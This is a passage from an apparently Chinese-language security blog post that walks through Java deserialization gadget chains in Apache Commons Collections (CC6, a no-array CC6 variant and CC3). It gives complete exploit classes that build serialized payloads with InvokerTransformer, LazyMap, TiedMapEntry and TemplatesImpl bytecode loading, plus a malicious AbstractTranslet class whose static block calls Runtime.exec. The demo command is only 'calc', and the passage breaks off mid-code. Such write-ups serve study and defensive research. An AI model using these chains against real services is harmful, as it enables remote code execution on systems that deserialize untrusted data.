text"><br>我们会发现其在lazyMap里找到了keykey这个key，很奇怪明明没有定义这个key却能找到这个key<br>这是因为我们在使用ser_map.put是也触发了如下代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><br>这就导致了keykey被写入到lazyMap里，解决方法也简单，直接使用lazyMap.remove(“keykey”)<br>这样即可，<br>而在反序列化前就执行命令我们可以先给ChainedTransformer传入一个假的Transform数组然后在ser_map.put后再通过反射传入一个真的Transform数组。exp如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; ser_map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        ser_map.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, Transformer);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        Serializ(ser_map);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="CC6改造无需数组"><a href="#CC6改造无需数组" class="headerlink" title="CC6改造无需数组"></a>CC6改造无需数组</h2><p>我们还可以改造一下这个CC6的命令执行方法让其无需使用数组即可进行命令执行<br>想要不使用数组来进行命令执行，就需要使用加载字节码的方式来进行命令执行。<br><img src="/2024/09/25/CC%E9%93%BE/CC6_.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC6_6.png" class="" title="alt text"><br>我们查看其调用链会发现我们可以控制transform(Obj)的参数Obj，即我们只要传入templates，方式的方法为newTransform这样就可以通过反射调用templates.newTransform来直接加载字节码来命令执行，只要是Obj可控的cc链我们都可以通过加载字节码的方法来直接命令执行。代码如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_noArray</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map, transformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);<span class="comment">//向key传入参数templates使得可以不使用数组</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; ser_map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        ser_map.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Field iMethodName=transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        iMethodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iMethodName.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        Serializ(ser_map);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>学这个链的目的其实很简单，就是这个链给出了第二种命令执行的方法就是通过类加载的方法来进行命令执行。</p>
<p>CC3的前半段其实和CC1是没有什么区别的所以我先在这里记录一下如何通过类加载来命令执行</p>
<p>还是一样先分析命令执行的原因</p>
<p>首先我们知道在使用ClassLoader加载类后实例化会命令执行其构造函数static块等等。而ClassLoader调用的底层就是defineClass，但是其defineClass都不是public类，我们需要找到一个重写了defineClass方法并且为public且可序列化的类</p>
<img src="/2024/09/25/CC%E9%93%BE/CC3_2.png" class="" title="alt text">
<img src="/2024/09/25/CC%E9%93%BE/CC3_1.png" class="" title="alt text">
<p>我们查找如上格式defineClass就可以找到在com.sun.org.apache.xalan.internal.xsltc.trax包下的TemplatesImpl其重写了调用了defineClass()</p>
<img src="/2024/09/25/CC%E9%93%BE/CC3_3.png" class="" title="alt text">
<p>通过查找用法我们可以看到defineTransletClasses()调用了defineClass()再往上找<br><img src="/2024/09/25/CC%E9%93%BE/CC3_7.png" class="" title="alt text"><br>我们可以找到getTransletInstance()下调用了defineTransletClasses()并且其将我们的类使用了newInstance()进行了实例化。<br><img src="/2024/09/25/CC%E9%93%BE/CC3_4.png" class="" title="alt text"><br>再网上找就可以找到public的newTransformer()<br>找到这个我们就可以使用我们CC1链的前半部分来反射调用这个newTransformer<br>那么我们要利用这个来进行命令执行肯定是要使用反射来讲其内部属性进行赋值。</p>
<p>我们看getTransletInstance()方法<br><img src="/2024/09/25/CC%E9%93%BE/CC3_7.png" class="" title="alt text"><br>会发现其需要<code>_name</code>有值，且<code>_class</code>没值才会进入defineTransletClasses()<br><img src="/2024/09/25/CC%E9%93%BE/CC_8.png" class="" title="alt text"><br>我们查看defineTransletClasses()会发现有使用<code>_tfactory</code>那么这个值就需要有值不然会报错，且其将字节码<code>_bytecodes[i]</code>传入defineClass处理<br>那么我们只要往_bytecodes内传入我们要加载的恶意类就可以命令执行。<br><img src="/2024/09/25/CC%E9%93%BE/CC3_8.png" class="" title="alt text"><br>我们查看各种属性类型可以发现_bytecodes为二维数组<br><img src="/2024/09/25/CC%E9%93%BE/CC3_9.png" class="" title="alt text"><br>但是_tfactory为transient即其无法被序列化，但是我们又要调用这个，那么其一定再反序列时被赋了值<br>我们看readObject<br><img src="/2024/09/25/CC%E9%93%BE/CC3_10.png" class="" title="alt text"><br>会发现其被赋值为new TransformerFactoryImpl();<br>这样我们就可以编写一个demo来查看命令执行了如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class clazz=tmpl.getClass();</span><br><span class="line">        Field namefeld= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        namefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefeld.set(tmpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytefeld= clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_demo.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes= &#123;code&#125;;</span><br><span class="line">        bytefeld.set(tmpl,bytecodes);</span><br><span class="line">        Field tfactoryfeld= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfeld.set(tmpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        tmpl.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>但是其还是会报错无法命令执行，这个问题是出在恶意类上我们下断点调试<br><img src="/2024/09/25/CC%E9%93%BE/CC3_13.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC3_14.png" class="" title="alt text"><br>我们会发现只要我们恶意类的父类的值等于ABSTRACT_TRANSLET就会对_transletIndex赋值，且不会进入else即不会报错，而下面还有一个对_transletIndex的判断如果小于0就抛出异常，即我们的恶意类的父类名要为ABSTRACT_TRANSLET即如下类<br><img src="/2024/09/25/CC%E9%93%BE/CC3_12.png" class="" title="alt text"><br>恶意类代码如下即可命令执行<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>那么这条链的前半段我们已经写完了<br>其前半段其实就是使用CC1来反射newTransformer来进行命令执行<br>exp如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class clazz=tmpl.getClass();</span><br><span class="line">        Field namefeld= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        namefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefeld.set(tmpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytefeld= clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes= &#123;code&#125;;</span><br><span class="line">        bytefeld.set(tmpl,bytecodes);</span><br><span class="line">        Field tfactoryfeld= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfeld.set(tmpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        tmpl.newTransformer();</span><br><span class="line"></span><br><span class="line">        Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(tmpl),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Constructor constructor=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line"></span><br><span class="line">        Serializ(o);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们还可以使用进一步的向上寻找，来不使用InvokerTransformer进行命令执行</p>
<p>我们再往上找可以找到TrAXFilter这个类，<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以看到其构造方法调用了templates.newTransformer()。但是因为其是构造方法，我们要触发只能通过实例化或者反射。<br>而我们在InstantiateTransformer下可以找到另一个transform。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                  <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                      + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">          <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><br>我们可以利用这transform来实例化TrAXFilter从而触发器构造方法从而加载字节码命令执行<br>exp如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span 